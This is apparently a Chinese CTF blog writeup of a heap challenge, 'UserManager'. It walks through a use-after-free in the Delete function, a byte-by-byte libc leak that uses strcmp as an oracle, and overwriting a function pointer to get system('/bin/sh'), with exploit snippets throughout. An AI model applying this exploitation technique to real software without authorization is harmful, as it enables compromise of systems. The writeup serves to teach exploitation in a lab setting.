---
title: "UserManager —— 基础堆利用 Writeup"
pubDatetime: 2026-05-30T18:23:11+08:00
tags:
  - pwn
  - heap
description: "保护全开的堆题：先还原用户结构体，再利用堆漏洞配合地址泄露与函数指针劫持完成利用，是一道堆入门练习。"
---

![image-20260530182311201](/assets/images/pwn-user-manager/image-20260530182311201.png)

pwn第四题，是个基础堆题

我们先使用 `checksec` 查看保护：

![image-20260530183024109](/assets/images/pwn-user-manager/image-20260530183024109.png)

保护比较全：

Full RELRO：不能改 GOT
Canary：不适合打栈溢出
NX：不能直接执行 shellcode
PIE：程序地址随机化

因此本题主要利用方向是堆漏洞 + 地址泄露 + 函数指针劫持

程序中没有显式给出结构体定义，但可以根据 `Register`、`Login`、`Edit` 和 `Delete` 中的访问方式还原出用户结构体。

在 `Register` 功能中，程序会先申请密码空间，然后申请一个 `0x18` 大小的结构体，大致逻辑如下

![image-20260530184202296](/assets/images/pwn-user-manager/image-20260530184202296.png)

伪代码如下逻辑

```c#
pwd = malloc(size);
read(0, pwd, size);
user = malloc(0x18);
user->data = pwd;
user->p = show;
user->size = size;
users[id] = user;
```

64 位程序中一个指针大小为 8 字节，结构体总大小为 `0x18`，因此可以还原为：

```c
struct user {
    char *data;          // offset 0x00，保存密码地址
    void (*p)(char *);   // offset 0x08，登录成功后调用，默认是 show
    long long size;      // offset 0x10，密码长度
};
```

在 `Login` 中，程序会先比较用户输入和保存的密码：

```c
strcmp(input, users[id]->data);
```

如果比较成功，就调用结构体里的函数指针：

```c
users[id]->p(users[id]->data);
```

因此，如果可以控制 `users[id]->data` 和 `users[id]->p`，就可以构造：

```c
system("/bin/sh");
```

漏洞主要出现在 `Delete` 功能中

![image-20260530184335552](/assets/images/pwn-user-manager/image-20260530184335552.png)

程序释放用户时会执行：

```c
free(users[id]->data);
free(users[id]);
```

但是释放之后没有清空指针：

```c
users[id] = NULL;
```

这会导致 Use After Free

释放后，`users[id]` 仍然保存着旧的堆地址。如果后续再次申请相同大小的 chunk，新申请的内容就可能复用已经释放的用户结构体。这样就可以通过新用户的 password chunk 修改旧用户结构体中的字段

利用思路如下：

1. 申请 user0 和 user1，构造堆布局。
2. 删除 user0 和 user1，制造 UAF。
3. 再申请 user2，使 user2 的 password chunk 复用已经释放的 user1 结构体。
4. 通过 edit user2 修改 user1 结构体中的 data 指针低字节。
5. 利用 Login 中的 strcmp 作为 oracle，逐字节泄露 unsorted bin 中的 libc 地址。
6. 根据泄露值计算 libc base 和 system 地址。
7. 再次通过 edit user2 改变 user1->data，使其指向 user0->p。
8. edit user1，将 user0->p 覆盖为 system。
9. edit user0，将 user0->data 内容改为 "/bin/sh\x00"。
10. login user0，密码校验成功后触发 system("/bin/sh")。

最终执行流为：

```c
users[0]->p(users[0]->data);
```

被改造成：

```c
system("/bin/sh");
```

堆布局构造

首先申请两个用户：

```python
user_register(0, 0x80, b"a")
user_register(1, 0x20, b"b")
```

对应的堆块大致如下：

```text
user0_data      request 0x80，实际 chunk size 0x90
user0_struct    request 0x18，实际 chunk size 0x20

user1_data      request 0x20，实际 chunk size 0x30
user1_struct    request 0x18，实际 chunk size 0x20
```

然后释放两个用户：

```python
user_delete(0)
user_delete(1)
```

释放后：

```text
users[0] 仍然指向已释放的 user0_struct
users[1] 仍然指向已释放的 user1_struct
```

其中 `user0_data` 的实际大小是 `0x90`，在 glibc 2.23 中会进入 unsorted bin，里面会残留 `main_arena` 相关地址。这个地址后面可以用来泄露 libc。

接着申请 user2：

```python
user_register(2, 0x18, p8(0x20))
```

`0x18` 申请对应的实际 chunk size 是 `0x20`，会从 fastbin 中取出之前释放的结构体 chunk。此时 user2 的 password chunk 会复用旧的 `user1_struct`，因此我们通过 `edit user2` 就可以修改 dangling 的 `users[1]` 结构体字段。

再申请 user3：

```python
user_register(3, 0x80, b"aaaa")
```

这个申请会复用之前释放的 `user0_data`，也就是 unsorted bin chunk。虽然写入了 `aaaa`，但后面的 libc 残留指针仍然可以通过后续 oracle 方式逐字节泄露。

程序没有提供直接输出地址的功能，因此不能直接 `puts` 泄露 libc。这里利用 `Login` 中的密码比较逻辑作为 oracle

![image-20260530184656012](/assets/images/pwn-user-manager/image-20260530184656012.png)

`Login` 的核心逻辑可以理解为：

```c
if (!strcmp(input, users[id]->data)) {
    puts("Login success!");
    users[id]->p(users[id]->data);
}
```

如果输入数据和 `users[id]->data` 指向的内存内容一致，程序会输出：

```text
success
```

因此可以逐字节爆破目标地址处的内容

拿到 `system` 地址之后，就需要把 `user0->p` 改成 `system`。

当前已经可以通过 user2 控制 dangling 的 `user1` 结构体中的 `data` 指针。于是先修改 `user1->data` 的低字节，使其指向 `user0` 结构体中的函数指针字段：

```python
user_edit(2, p8(0xA8))
```

然后通过 `edit user1` 向该位置写入 `system` 地址：

```python
user_edit(1, p64(system_addr))
```

这一步完成后，相当于：

```c
user0->p = system;
```

接着将 user0 的密码内容改成 `/bin/sh\x00`：

```python
user_edit(0, b"/bin/sh\x00")
```

最后登录 user0：

```python
user_login(0, len(b"/bin/sh\x00"), b"/bin/sh\x00")
```

登录时：

```text
输入密码 == user0->data 指向的 "/bin/sh\x00"
```

所以 `strcmp` 校验成功，然后程序调用：

```c
users[0]->p(users[0]->data);
```

此时已经变成：

```c
system("/bin/sh");
```

成功 getshell

如下

![屏幕截图 2026-05-30 165101](/assets/images/pwn-user-manager/2026-05-30-165101.png)
